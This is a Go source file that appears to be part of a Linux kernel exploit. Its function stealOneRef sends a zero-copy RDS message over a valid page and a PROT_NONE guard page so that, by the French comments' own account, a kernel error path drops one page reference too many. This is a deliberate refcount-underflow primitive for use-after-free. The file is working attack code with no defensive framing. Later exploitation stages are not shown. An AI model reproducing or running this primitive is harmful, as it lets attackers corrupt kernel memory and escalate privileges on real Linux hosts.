package main

import (
	"syscall"
	"unsafe"
)

const (
	afRDS              = 21
	solRDS             = 276
	soRDSTransport     = 8
	rdsCMSGZcookieType = 12  // RDS_CMSG_ZCOPY_COOKIE
	soZerocopy         = 60
	msgZerocopy        = 0x4000000
	pageSize           = 4096
	portBase           = 20000
)

// cmsghdr layout verified on x86_64:
//   offset 0:  cmsg_len  (size_t = uint64, 8 bytes)
//   offset 8:  cmsg_level (int32, 4 bytes)
//   offset 12: cmsg_type  (int32, 4 bytes)
//   sizeof = 16
// CMSG_LEN(4)   = 16 + 4 = 20
// CMSG_SPACE(4) = 16 + CMSG_ALIGN(4) = 16 + 8 = 24
type cmsghdr struct {
	Len   uint64 // size_t
	Level int32
	Type  int32
}

type rawSockaddrInet4 struct {
	Family uint16
	Port   uint16
	Addr   [4]byte
	Zero   [8]byte
}

// linux msghdr (x86_64)
type msghdr struct {
	Name       *rawSockaddrInet4
	Namelen    uint32
	Pad0       uint32
	Iov        *syscall.Iovec
	Iovlen     uint64
	Control    *byte
	Controllen uint64
	Flags      int32
	Pad1       int32
}

// stealOneRef : sendmsg RDS zcopy sur (page, guard) -> GUP pin page OK,
// guard PROT_NONE -> fault -> error path: put_page + __free_page -> -1 refcount.
func stealOneRef(pageAddr uintptr, port int) syscall.Errno {
	fd, _, errno := syscall.RawSyscall(syscall.SYS_SOCKET, afRDS, syscall.SOCK_SEQPACKET, 0)
	if errno != 0 {
		return errno
	}
	defer syscall.Close(int(fd))

	v := int32(1)
	syscall.Syscall6(syscall.SYS_SETSOCKOPT, fd,
		syscall.SOL_SOCKET, soZerocopy,
		uintptr(unsafe.Pointer(&v)), 4, 0)

	sndbuf := int32(2 * pageSize * 4)
	syscall.Syscall6(syscall.SYS_SETSOCKOPT, fd,
		syscall.SOL_SOCKET, syscall.SO_SNDBUF,
		uintptr(unsafe.Pointer(&sndbuf)), 4, 0)

	v = 2
	syscall.Syscall6(syscall.SYS_SETSOCKOPT, fd,
		solRDS, soRDSTransport,
		uintptr(unsafe.Pointer(&v)), 4, 0)

	bindSA := rawSockaddrInet4{
		Family: syscall.AF_INET,
		Port:   htons(uint16(port)),
		Addr:   [4]byte{127, 0, 0, 1},
	}
	syscall.RawSyscall(syscall.SYS_BIND, fd,
		uintptr(unsafe.Pointer(&bindSA)), 16)

	destSA := bindSA
	destSA.Port = htons(uint16(port + 1))

	// iov : page valide + page guard PROT_NONE -> GUP fault sur 2eme page
	iov := syscall.Iovec{
		Base: (*byte)(unsafe.Pointer(pageAddr)),
		Len:  2 * pageSize,
	}

	// cmsg : SOL_RDS / RDS_CMSG_ZCOPY_COOKIE
	// CMSG_SPACE(4) = 24 octets, CMSG_LEN(4) = 20
	cmsgBuf := make([]byte, 24)
	cm := (*cmsghdr)(unsafe.Pointer(&cmsgBuf[0]))
	cm.Len = 20           // CMSG_LEN(sizeof(uint32)) = 16 + 4 = 20
	cm.Level = solRDS
	cm.Type = rdsCMSGZcookieType // 12 = RDS_CMSG_ZCOPY_COOKIE
	// cmsgBuf[16..19] = cookie uint32 = 0 (zero-initialise par make)

	msg := msghdr{
		Name:       &destSA,
		Namelen:    16,
		Iov:        &iov,
		Iovlen:     1,
		Control:    &cmsgBuf[0],
		Controllen: 24, // CMSG_SPACE(4)
	}

	_, _, sendErrno := syscall.RawSyscall(syscall.SYS_SENDMSG, fd,
		uintptr(unsafe.Pointer(&msg)),
		msgZerocopy|syscall.MSG_DONTWAIT)
	return sendErrno
}

func htons(v uint16) uint16 {
	return (v<<8)&0xff00 | v>>8
}
